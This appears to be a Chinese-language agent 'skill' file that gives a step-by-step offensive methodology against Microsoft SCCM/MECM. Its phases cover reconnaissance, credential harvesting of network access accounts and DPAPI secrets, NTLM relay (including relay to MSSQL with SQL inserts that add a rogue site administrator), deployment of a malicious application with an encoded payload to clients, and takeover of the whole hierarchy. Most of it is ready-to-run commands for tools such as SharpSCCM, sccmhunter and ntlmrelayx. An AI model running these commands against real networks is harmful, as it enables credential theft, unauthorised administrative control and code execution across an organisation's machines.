---
name: sccm-mecm-attack
description: "针对 Microsoft SCCM/MECM (Configuration Manager) 的攻击方法论。当内网发现 SCCM 站点服务器、管理点(MP)、分发点(DP) 时使用。覆盖 NAA 凭证提取、任务序列密码、PXE 启动介质、Client Push 强制认证、站点服务器接管、应用部署横向移动、AdminService API 利用、层级接管(CAS→Primary)。"
metadata:
  tags: "sccm,mecm,configmgr,configuration manager,NAA,network access account,client push,PXE,task sequence,site takeover,hierarchy,SharpSCCM,sccmhunter,AdminService,SCCMSecrets,distribution point"
  category: "lateral"
---

# SCCM/MECM 攻击

## 触发条件

在以下场景使用本技能:
- 内网发现 SCCM / MECM / ConfigMgr 服务 (站点服务器、MP、DP)
- DNS 枚举发现 `_mssms_mp` 或 `_mssms_sul` SRV 记录
- 发现 Management Point (MP) 或 Distribution Point (DP)
- 需要利用 SCCM 进行横向移动或凭证获取
- BloodHound / LDAP 枚举发现 `mSSMSManagementPoint` 对象

## 前置要求

- 域用户凭证 (部分技术支持匿名或机器账号)
- 工具: SharpSCCM, sccmhunter, SCCMSecrets, pxethiefy, cmloot, ntlmrelayx
- 网络可达: MP (TCP 80/443), DP (TCP 80/443), Site DB (TCP 1433), SMS Provider (TCP 443)

## SCCM 架构速查表

| 角色 | 说明 | 默认端口 | 关键标识 |
|------|------|----------|----------|
| **Primary Site Server** | 核心管理服务器 | - | 运行 SMS_SITE_COMPONENT_MANAGER |
| **Management Point (MP)** | 客户端策略分发 | 80/443 | IIS CCM_* 虚拟目录 |
| **Distribution Point (DP)** | 内容分发 | 80/443 | SMS_DP$ 共享 / SCCMContentLib$ |
| **Site Database** | SQL Server 存储 | 1433 | RBAC_Admins / RBAC_ExtendedPermissions |
| **SMS Provider** | WMI/AdminService API | 443 | AdminService REST API |
| **CAS** | 层级顶层 (多站点) | - | 管理多个 Primary |

---

## 决策树

```
[开始] 发现 SCCM 基础设施
    │
    ├─ 有域凭证？
    │   ├─ 是 → Phase 1: SCCM 侦察
    │   └─ 否 → PXE 启动介质 / 匿名注册尝试
    │
    ├─ 凭证获取
    │   ├─ 可注册设备或控制机器账号 → Phase 2: 秘密策略提取
    │   └─ 已在 SCCM 客户端 → 本地 DPAPI 提取
    │
    ├─ 权限提升
    │   ├─ Client Push 启用 → Phase 3: 强制认证 relay
    │   └─ 有 SCCM 管理员 → Phase 4: 横向移动
    │
    └─ 层级接管
        └─ 多站点环境 → Phase 5: CAS 传播
```

---

## Phase 1: SCCM 侦察

**目标**: 发现并识别 SCCM 基础设施组件

### 1.1 DNS SRV 记录查询

```bash
# 查找 Management Point
nslookup -type=SRV _mssms_mp._tcp.$DOMAIN
dig SRV _mssms_mp._tcp.$DOMAIN

# 查找 Software Update Point
nslookup -type=SRV _mssms_sul._tcp.$DOMAIN
```

### 1.2 LDAP 枚举

```powershell
# 查找 Management Point 对象
([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties}

# 查找 SCCM 相关 SPN
setspn -Q *SMS* | findstr /i "SMS"
setspn -Q *SCCM* | findstr /i "SCCM"
```

### 1.3 sccmhunter 自动侦察

```bash
# 发现 SCCM 基础设施
sccmhunter.py find -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP

# SMB 枚举确认角色
sccmhunter.py smb -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP

# 显示发现结果
sccmhunter.py show -smb
sccmhunter.py show -all
```

### 1.4 本地信息收集

```powershell
# 本地站点信息 (已安装 SCCM 客户端)
SharpSCCM.exe local site-info

# WMI 查询
Get-WmiObject -Class SMS_Authority -Namespace root\CCM
```

### 1.5 PXE 启动介质发现

```bash
# 探测 PXE 环境 (无需域凭证)
pxethiefy.py explore -i $INTERFACE
```

---

## Phase 2: 凭证获取

**目标**: 提取 NAA 凭证、任务序列密码、DP 敏感文件

### 2.1 NAA 提取 — 注册新设备

```bash
# HTTP MP — SCCMSecrets (推荐)
python3 SCCMSecrets.py policies -mp "http://$MP_IP" \
  -u "$MACHINE_NAME" -p "$MACHINE_PASSWORD" -cn "newdevice"

# HTTPS MP (PKI 环境)
python3 SCCMSecrets.py policies -mp "https://$MP_IP" \
  -u '$MACHINE_NAME' -p '$MACHINE_PASSWORD' -cn 'newdevice' \
  --pki-cert ./cert.pem --pki-key ./key.pem

# NTLM relay 提取策略
ntlmrelayx.py -t 'http://$MP_IP/ccm_system_windowsauth/request' \
  -smb2support --sccm-policies

# sccmhunter 自动化
sccmhunter.py http -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -auto
```

```powershell
# Windows — SharpSCCM
SharpSCCM.exe get secrets -r newdevice -u $MACHINE_NAME -p $PASSWORD
```

### 2.2 PXE 启动介质密码提取

```bash
# Phase 1 发现 PXE 后，解密启动介质中的凭证
pxethiefy.py decrypt -f $PXE_MEDIA_FILE
```

### 2.3 NAA 提取 — 复用已有设备

```bash
# 使用已攻陷设备的注册凭据
python3 SCCMSecrets.py policies -mp "http://$MP_IP" \
  --use-existing-device compromised_device/
```

### 2.4 本地 DPAPI 提取

```bash
# SystemDPAPIdump (远程)
SystemDPAPIdump.py -creds -sccm $DOMAIN/$USER:$PASSWORD@$TARGET
```

```powershell
# SharpSCCM 本地
SharpSCCM.exe local secrets disk
SharpSCCM.exe local secrets wmi

# SharpDPAPI
SharpDPAPI.exe SCCM
```

```
# mimikatz
dpapi::sccm
```

### 2.5 WMI 直接查询

```powershell
# NAA 凭证 (加密 blob)
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig \
  -Class CCM_NetworkAccessAccount

# 任务序列变量
Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig \
  -Class CCM_TaskSequence
```

### 2.6 Distribution Point 文件搜刮

```bash
# SCCMSecrets — 按扩展名搜刮
python3 SCCMSecrets.py files -dp "http://$DP_IP" \
  -u '$USER' -H '$HASH' \
  --extensions '.txt,.xml,.ps1,.pfx,.ini,.conf'

# cmloot — 批量搜刮
python3 cmloot.py $DOMAIN/$USER@$TARGET \
  -findsccmservers -target-file sccmhosts.txt \
  -cmlootdownload sccmfiles.txt
```

---

## Phase 3: 权限提升

**目标**: 通过 Client Push / Site DB / AdminService relay 获取站点管理员

### 3.1 Client Push 强制认证

**原理**: Client Push 安装会使用高权限账号对目标发起 NTLM 认证，relay 到其他目标。

```bash
# 启动 relay
ntlmrelayx.py -smb2support -socks -ts -ip $ATTACKER_IP -t $TARGET
```

```powershell
# 触发 Client Push
SharpSCCM.exe invoke client-push -t $TARGET --as-admin
```

### 3.2 站点接管 — MSSQL Relay

**原理**: 站点服务器机器账号对 Site Database 有 sysadmin 权限，relay 到 MSSQL 后注入管理员。

```bash
# 步骤 1: 启动 MSSQL relay
ntlmrelayx.py -t "mssql://$SITE_DB" -smb2support -socks

# 步骤 2: 触发站点服务器认证 (Coercer / PetitPotam 等)
# 步骤 3: 通过 SOCKS 连接 SQL
proxychains mssqlclient.py "DOMAIN/$SITE_SERVER$"@"$SITE_DB" -windows-auth
```

```sql
-- 步骤 4: 注入 SCCM 管理员
-- 先获取目标用户 SID
USE CM_$SITE_CODE;
INSERT INTO RBAC_Admins (AdminSID, LogonName, DisplayName, IsGroup, IsDeleted, CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite)
VALUES ($ADMIN_SID, '$DOMAIN\$USER', '$DOMAIN\$USER', 0, 0, '', '', '', '', '$SITE_CODE');

INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)
VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER'),
        'SMS0001R', 'SMS00ALL', 29);

INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)
VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER'),
        'SMS0001R', 'SMS00001', 1);

INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)
VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER'),
        'SMS0001R', 'SMS00004', 1);
```

### 3.3 站点接管 — AdminService Relay

```bash
# relay 到 SMS Provider AdminService
ntlmrelayx.py -t "https://$SMS_PROVIDER/AdminService/wmi/SMS_Admin" \
  -smb2support --adminservice \
  --logonname "$DOMAIN\\$USER" \
  --displayname "$DOMAIN\\$USER" \
  --objectsid $OBJECTSID
```

### 3.4 Passive → Active 站点服务器 Relay

```bash
# relay passive 站点服务器到 active 站点服务器
ntlmrelayx.py -t $ACTIVE_SERVER -smb2support -socks

# 通过 SOCKS dump hash
proxychains4 secretsdump.py $DOMAIN/$PASSIVE_SERVER\$@$ACTIVE_SERVER

# 以 active 站点服务器身份接管
sccmhunter.py admin -u $ACTIVE_SERVER\$ -p $LMHASH:$NTHASH -ip $SMS_PROVIDER_IP
```

---

## Phase 4: 横向移动

**目标**: 利用 SCCM 管理员权限在客户端执行命令

### 4.1 应用部署

```powershell
# SharpSCCM — 指定资源 ID 执行
SharpSCCM.exe exec -rid $RESOURCE_ID -r $TARGET
```

### 4.2 PowerSCCM 完整工作流

```powershell
# 发现站点代码
Find-SccmSiteCode -ComputerName $SITE_SERVER

# 建立会话
$session = New-SccmSession -ComputerName $SITE_SERVER -SiteCode $SITE_CODE -Credential $CRED

# 创建恶意应用
New-SccmApplication -Session $session -ApplicationName "evilApp" \
  -PowerShellB64 $ENCODED_PAYLOAD

# 部署到目标
New-SccmApplicationDeployment -Session $session -ApplicationName "evilApp" \
  -AssignmentName "deploy" -CollectionName "target_collection"

# 强制客户端检入
Invoke-SCCMDeviceCheckin -Session $session -CollectionName "target_collection"
```

### 4.3 CMScript 执行

```powershell
New-CMScriptDeployement -CMDrive 'E' -ServerFQDN '$SITE_SERVER' \
  -TargetDevice '$TARGET' -Path '.\payload.ps1' -ScriptName 'evilScript'
```

### 4.4 AdminService API 交互

```bash
# sccmhunter 管理控制台
sccmhunter.py admin -u "$USER" -p "$PASSWORD" -ip "$SITE_SERVER_IP"

# 交互命令: help, interact, ps, ls, cat, exec, etc.
```

---

## Phase 5: 层级接管

**目标**: 从单站点扩展到整个 SCCM 层级

### 5.1 CAS 自动传播

在任一 Primary 站点添加的管理员会自动传播到 CAS 及所有子站点。利用 Phase 3 在一个 Primary 上执行 `add_admin` 后，等待复制同步即可控制全部站点。

```bash
# 在 sccmhunter admin 会话中
add_admin $DOMAIN\\$USER $ADMIN_SID
```

### 5.2 TAKEOVER-5: 跨站点 AdminService Relay

在多站点环境中，relay 到远程 SMS Provider 的 AdminService 添加管理员。

```bash
ntlmrelayx.py -t "https://$REMOTE_SMS_PROVIDER/AdminService/wmi/SMS_Admin" \
  -smb2support --adminservice \
  --logonname "$DOMAIN\\$USER" \
  --displayname "$DOMAIN\\$USER" \
  --objectsid $OBJECTSID
```

> **注意**: ConfigMgr 2509+ 默认拒绝 AdminService 上的 NTLM 认证，此技术仅适用于早期版本。

---

## 常见问题排查

### 无法注册新设备

1. MP 要求 HTTPS + 客户端证书 — 需获取 PKI 证书或 relay
2. 自动审批未开启 — 尝试 relay 已批准设备的认证
3. 站点配置 "仅域加入设备" — 需使用已有机器账号

### NAA 提取为空

1. 站点未配置 NAA (eNAA 环境) — 尝试任务序列提取
2. NAA 密码已过期 — 检查 Collection Variables
3. WMI 策略尚未下发 — 等待策略刷新周期

### Relay 失败

1. 目标启用 SMB 签名 — 无法 relay SMB，改用 HTTP/MSSQL
2. EPA (Extended Protection for Authentication) — 绕过需要 TLS 证书私钥
3. ConfigMgr 2509+ 拒绝 NTLM on AdminService — 需使用 MSSQL 路径

---

## 工具参考

| 工具 | 用途 | 平台 |
|------|------|------|
| sccmhunter | SCCM 侦察/利用/管理 | Linux |
| SharpSCCM | SCCM 客户端利用 | Windows |
| SCCMSecrets | 策略/NAA/DP 提取 | Linux |
| pxethiefy | PXE 启动介质分析 | Linux |
| cmloot / sccm-http-looter | DP 文件搜刮 | Linux |
| ntlmrelayx | NTLM relay 攻击 | Linux |
| PowerSCCM | SCCM 管理操作 | Windows |

---

## 深入参考

- → [references/sccm-enumeration.md](references/sccm-enumeration.md) — SCCM 侦察方法与工具命令参考
- → [references/credential-harvesting.md](references/credential-harvesting.md) — 秘密策略提取、NAA/任务序列/DP 凭证获取详解
- → [references/site-takeover.md](references/site-takeover.md) — 站点接管与横向移动完整攻击链
